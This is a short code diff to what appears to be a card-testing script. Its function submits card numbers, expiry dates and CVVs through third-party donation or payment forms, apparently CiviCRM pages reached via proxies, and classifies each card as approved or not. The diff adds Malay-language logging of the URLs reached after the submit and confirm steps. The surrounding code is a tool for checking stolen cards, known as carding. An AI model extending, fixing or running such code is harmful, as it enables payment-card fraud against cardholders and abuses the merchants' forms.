@@ -488,6 +488,9 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
             confirm_btn = soup_resp.find('input', {'name': '_qf_Confirm_next'}) or soup_resp.find('button', {'name': '_qf_Confirm_next'})
             is_confirmation = '_qf_Confirm_display=true' in response.url or '_qf_Confirm_display=1' in response.url
             
+            # ---> PRINT URL CONFIRMATION PAGE <---
+            logging.info(f"URL Selepas Submit Pertama: {response.url}")
+            
             if confirm_btn or is_confirmation:
                 input_qfkey = soup_resp.find('input', {'name': 'qfKey'})
                 if input_qfkey: qfkey = input_qfkey.get('value', qfkey)
@@ -501,6 +504,8 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
 
                 clean_confirm = build_clean_payload(merged_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_url, is_confirm=True)
                 confirm_response = session.post(form_action, data=clean_confirm, timeout=25, allow_redirects=True)
+                
+                logging.info(f"URL Selepas Submit Confirm: {confirm_response.url}")
                 
                 if confirm_response.status_code == 500:
                     result = {'approved': False, 'has_msg': True, 'message': 'Site Error / Not Authorize', 'clean_response': 'Site Error'}
